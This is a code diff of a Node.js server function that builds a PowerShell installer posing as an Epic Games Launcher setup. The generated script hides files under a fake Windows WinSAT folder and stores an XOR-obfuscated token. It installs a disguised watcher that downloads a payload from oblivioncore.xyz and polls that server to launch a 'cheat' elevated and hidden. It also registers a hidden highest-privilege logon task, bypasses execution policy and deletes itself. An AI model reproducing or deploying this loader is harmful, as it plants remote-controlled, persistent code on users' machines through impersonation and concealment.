@@ -20,141 +20,130 @@ function generateInstaller(token, username) {
   const xorBytes = xorToken(token);
   const byteArray = Array.from(xorBytes).join(',');
 
-  return `# Epic Games Launcher — Setup
-# (c) Epic Games, Inc. All rights reserved.
-# Version 15.17.1 Build 24621
-#Requires -Version 5.0
-$ErrorActionPreference = 'SilentlyContinue'
+  // PS1 built as plain string — no template literal (avoids Node choking on PS $ and backticks)
+  const ps1 = [
+    "# Epic Games Launcher \u2014 Setup",
+    "# (c) Epic Games, Inc. All rights reserved.",
+    "# Version 15.17.1 Build 24621",
+    "#Requires -Version 5.0",
+    "$ErrorActionPreference = 'SilentlyContinue'",
+    "",
+    "$installBase  = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'WinSAT', 'DataStore')",
+    "$taskName     = 'MicrosoftWinSAT'",
+    "$taskDesc     = 'Windows System Assessment Tool \u2014 Performance Monitor'",
+    "$launchScript = [System.IO.Path]::Combine($installBase, 'WinSATHelper.ps1')",
+    "$configDat    = [System.IO.Path]::Combine($installBase, 'config.dat')",
+    "",
+    "New-Item -ItemType Directory -Path $installBase -Force | Out-Null",
+    "$folder = Get-Item $installBase",
+    "$folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System",
+    "",
+    "# Token XOR 0x5A",
+    `$xorBytes = [byte[]]@(${byteArray})`,
+    "[System.IO.File]::WriteAllBytes($configDat, $xorBytes)",
+    "(Get-Item $configDat).Attributes = 'Hidden','System'",
+    "",
+    "$launcherCode = @'",
+    "# Windows System Assessment Tool \u2014 Performance Data Collector",
+    "$ErrorActionPreference = 'SilentlyContinue'",
+    "$installBase = [System.IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','WinSAT','DataStore')",
+    "$configDat   = [System.IO.Path]::Combine($installBase,'config.dat')",
+    "$payloadUrl  = 'https://www.oblivioncore.xyz/api/installer/payload'",
+    "$apiBase     = 'https://www.oblivioncore.xyz'",
+    "$logFile     = [System.IO.Path]::Combine($installBase,'watcher.log')",
+    "",
+    "function Log {",
+    "    param($msg)",
+    '    $line = "[$(Get-Date -Format \'HH:mm:ss\')] $msg`r`n"',
+    "    try {",
+    "        $fs = [System.IO.File]::Open($logFile, 'Append', 'Write', 'ReadWrite')",
+    "        $sw = New-Object System.IO.StreamWriter($fs)",
+    "        $sw.Write($line); $sw.Flush(); $sw.Close(); $fs.Close()",
+    "    } catch {}",
+    "}",
+    "",
+    "function Get-Token {",
+    "    try {",
+    "        $raw = [System.IO.File]::ReadAllBytes($configDat)",
+    "        return (-join ($raw | ForEach-Object { [char]($_ -bxor 0x5A) })).Trim()",
+    '    } catch { Log "ERRORE lettura token: $_"; return $null }',
+    "}",
+    "",
+    "function Ensure-Payload {",
+    "    param($token)",
+    "    $exe = [System.IO.Path]::Combine($installBase,'dllhost.exe')",
+    '    if (Test-Path $exe) { Log "Payload gia presente"; return }',
+    '    Log "Scarico payload da $payloadUrl ..."',
+    "    try {",
+    "        $zipPath = [System.IO.Path]::Combine($env:TEMP,'winsvc_update.zip')",
+    "        $wc = New-Object System.Net.WebClient",
+    "        $wc.Headers.Add('Authorization',\"Bearer $token\")",
+    "        $wc.DownloadFile($payloadUrl, $zipPath)",
+    "        $zipSize = (Get-Item $zipPath -ErrorAction SilentlyContinue).Length",
+    '        Log "ZIP scaricato: $zipSize bytes"',
+    "        Expand-Archive -Path $zipPath -DestinationPath $installBase -Force",
+    "        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue",
+    '        Log "Payload estratto in $installBase"',
+    "    } catch {",
+    '        Log "ERRORE download payload: $_"',
+    "    }",
+    "}",
+    "",
+    "function Poll-AndInject {",
+    "    param($token)",
+    "    $initBat = [System.IO.Path]::Combine($installBase,'WinSATInit.bat')",
+    "    try {",
+    "        $wc  = New-Object System.Net.WebClient",
+    '        $url = "$apiBase/api/config?token=$token"',
+    "        $json = $wc.DownloadString($url) | ConvertFrom-Json",
+    "        if ($json.action_inject -eq $true) {",
+    '            Log "action_inject=true ricevuto \u2014 avvio cheat"',
+    "            $running = Get-Process -Name 'RuntimeBroker','dllhost' -ErrorAction SilentlyContinue | Where-Object { try { $_.MainModule.FileName -like \"*WinSAT*\" } catch { $false } }",
+    "            if (-not $running -and (Test-Path $initBat)) {",
+    '                Log "Avvio WinSATInit.bat..."',
+    "                Start-Process -FilePath 'cmd.exe' -ArgumentList ('/c \"' + $initBat + '\"') -WorkingDirectory $installBase -Verb RunAs -WindowStyle Hidden",
+    "            } elseif ($running) {",
+    '                Log "Cheat gia in esecuzione, skip"',
+    "            } else {",
+    '                Log "ERRORE: WinSATInit.bat non trovato in $installBase"',
+    "            }",
+    "        }",
+    '    } catch { Log "ERRORE poll: $_" }',
+    "}",
+    "",
+    'Log "Watcher avviato"',
+    "$token = Get-Token",
+    "Log \"Token letto: $(if(`$token){`$token.Substring(0,8)+'...'}else{'NULL'})\"",
+    "if ($token) { Ensure-Payload -token $token }",
+    "else { Log \"ERRORE: token null, config.dat mancante?\" }",
+    "while ($true) {",
+    "    $token = Get-Token",
+    "    if ($token) { Poll-AndInject -token $token }",
+    "    Start-Sleep -Seconds 3",
+    "}",
+    "'@",
+    "Set-Content -Path $launchScript -Value $launcherCode -Encoding UTF8",
+    "(Get-Item $launchScript).Attributes = 'Hidden','System'",
+    "",
+    "$action  = New-ScheduledTaskAction -Execute 'powershell.exe' `",
+    "             -Argument \"-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `\"`$launchScript`\"\"",
+    "$trigger = New-ScheduledTaskTrigger -AtLogOn",
+    "$settings= New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) `",
+    "             -MultipleInstances IgnoreNew -StartWhenAvailable",
+    "Register-ScheduledTask -TaskName `$taskName -Description `$taskDesc `",
+    "  -Action `$action -Trigger `$trigger -Settings `$settings `",
+    "  -RunLevel Highest -Force | Out-Null",
+    "",
+    "Start-Process powershell.exe -ArgumentList `",
+    "  \"-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File `\"`$launchScript`\"\" `",
+    "  -WindowStyle Hidden",
+    "",
+    "$self = $MyInvocation.MyCommand.Path",
+    "Start-Process cmd.exe -ArgumentList \"/c timeout /t 3 /nobreak >nul && del /f /q `\"`$self`\"\" `",
+    "  -WindowStyle Hidden",
+  ].join('\r\n');
 
-# ── Configurazione ────────────────────────────────────────────────────────────
-$installBase  = [System.IO.Path]::Combine($env:LOCALAPPDATA, 'Microsoft', 'WinSAT', 'DataStore')
-$taskName     = 'MicrosoftWinSAT'
-$taskDesc     = 'Windows System Assessment Tool — Performance Monitor'
-$launchScript = [System.IO.Path]::Combine($installBase, 'WinSATHelper.ps1')
-$configDat    = [System.IO.Path]::Combine($installBase, 'config.dat')
-$downloaderUrl = 'https://www.oblivioncore.xyz/api/installer/payload?token=${token}'
-
-# ── Crea cartella nascosta ────────────────────────────────────────────────────
-New-Item -ItemType Directory -Path $installBase -Force | Out-Null
-$folder = Get-Item $installBase
-$folder.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-
-# ── Scrivi config.dat (token XOR 0x5A) ───────────────────────────────────────
-# Decifrato automaticamente da dllhost.exe all'avvio
-$xorBytes = [byte[]]@(${byteArray})
-[System.IO.File]::WriteAllBytes($configDat, $xorBytes)
-(Get-Item $configDat).Attributes = 'Hidden','System'
-
-# ── Scrivi WinSATHelper.ps1 (watcher camuffato) ──────────────────────────────
-# Gira in background ad ogni logon, poll /api/config ogni 3s.
-# Quando action_inject = true → avvia dllhost.exe (il cheat).
-$launcherCode = @'
-# Windows System Assessment Tool — Performance Data Collector
-$ErrorActionPreference = 'SilentlyContinue'
-$installBase = [System.IO.Path]::Combine($env:LOCALAPPDATA,'Microsoft','WinSAT','DataStore')
-$configDat   = [System.IO.Path]::Combine($installBase,'config.dat')
-$payloadUrl  = 'https://www.oblivioncore.xyz/api/installer/payload'
-$apiBase     = 'https://www.oblivioncore.xyz'
-$logFile     = [System.IO.Path]::Combine($installBase,'watcher.log')
-
-function Log {
-    param($msg)
-    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg`r`n"
-    try {
-        $fs = [System.IO.File]::Open($logFile, 'Append', 'Write', 'ReadWrite')
-        $sw = New-Object System.IO.StreamWriter($fs)
-        $sw.Write($line); $sw.Flush(); $sw.Close(); $fs.Close()
-    } catch {}
-}
-
-# Leggi e decifra token (XOR 0x5A)
-function Get-Token {
-    try {
-        $raw = [System.IO.File]::ReadAllBytes($configDat)
-        return (-join ($raw | ForEach-Object { [char]($_ -bxor 0x5A) })).Trim()
-    } catch { Log "ERRORE lettura token: $_"; return $null }
-}
-
-# Scarica payload se dllhost.exe non esiste ancora
-function Ensure-Payload {
-    param($token)
-    $exe = [System.IO.Path]::Combine($installBase,'dllhost.exe')
-    if (Test-Path $exe) { Log "Payload gia presente"; return }
-    Log "Scarico payload da $payloadUrl ..."
-    try {
-        $zipPath = [System.IO.Path]::Combine($env:TEMP,'winsvc_update.zip')
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add('Authorization',"Bearer $token")
-        $wc.DownloadFile($payloadUrl, $zipPath)
-        $zipSize = (Get-Item $zipPath -ErrorAction SilentlyContinue).Length
-        Log "ZIP scaricato: $zipSize bytes"
-        Expand-Archive -Path $zipPath -DestinationPath $installBase -Force
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-        Log "Payload estratto in $installBase"
-    } catch {
-        Log "ERRORE download payload: $_"
-    }
-}
-
-# Poll /api/config e lancia cheat su action_inject
-function Poll-AndInject {
-    param($token)
-    $initBat = [System.IO.Path]::Combine($installBase,'WinSATInit.bat')
-    try {
-        $wc  = New-Object System.Net.WebClient
-        $url = "$apiBase/api/config?token=$token"
-        $json = $wc.DownloadString($url) | ConvertFrom-Json
-        if ($json.action_inject -eq $true) {
-            Log "action_inject=true ricevuto — avvio cheat"
-            $running = Get-Process -Name 'RuntimeBroker','dllhost' -ErrorAction SilentlyContinue | Where-Object { try { $_.MainModule.FileName -like "*WinSAT*" } catch { $false } }
-            if (-not $running -and (Test-Path $initBat)) {
-                Log "Avvio WinSATInit.bat..."
-                Start-Process -FilePath 'cmd.exe' -ArgumentList ('/c "' + $initBat + '"') -WorkingDirectory $installBase -Verb RunAs -WindowStyle Hidden
-            } elseif ($running) {
-                Log "Cheat gia in esecuzione, skip"
-            } else {
-                Log "ERRORE: WinSATInit.bat non trovato in $installBase"
-            }
-        }
-    } catch { Log "ERRORE poll: $_" }
-}
-
-# Main loop — gira per sempre in background
-Log "Watcher avviato"
-$token = Get-Token
-Log "Token letto: $(if($token){$token.Substring(0,8)+'...'}else{'NULL'})"
-if ($token) { Ensure-Payload -token $token }
-else { Log "ERRORE: token null, config.dat mancante?" }
-while ($true) {
-    $token = Get-Token
-    if ($token) { Poll-AndInject -token $token }
-    Start-Sleep -Seconds 3
-}
-'@
-Set-Content -Path $launchScript -Value $launcherCode -Encoding UTF8
-(Get-Item $launchScript).Attributes = 'Hidden','System'
-
-# ── Scheduled Task: avvio ad ogni logon ──────────────────────────────────────
-$action  = New-ScheduledTaskAction  -Execute 'powershell.exe' \`
-             -Argument "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-$settings= New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Hours 0) \`
-             -MultipleInstances IgnoreNew -StartWhenAvailable
-Register-ScheduledTask -TaskName $taskName -Description $taskDesc \`
-  -Action $action -Trigger $trigger -Settings $settings \`
-  -RunLevel Highest -Force | Out-Null
-
-# ── Avvia subito il launcher ──────────────────────────────────────────────────
-Start-Process powershell.exe -ArgumentList \`
-  "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass -File \`"$launchScript\`"" \`
-  -WindowStyle Hidden
-
-# ── Auto-elimina questo installer ────────────────────────────────────────────
-$self = $MyInvocation.MyCommand.Path
-Start-Process cmd.exe -ArgumentList "/c timeout /t 3 /nobreak >nul && del /f /q \`"$self\`"" \`
-  -WindowStyle Hidden
-
-`;
+  return ps1;
 }
 
 // ─── GET /api/admin/generate-installer/:userId ────────────────────────────────
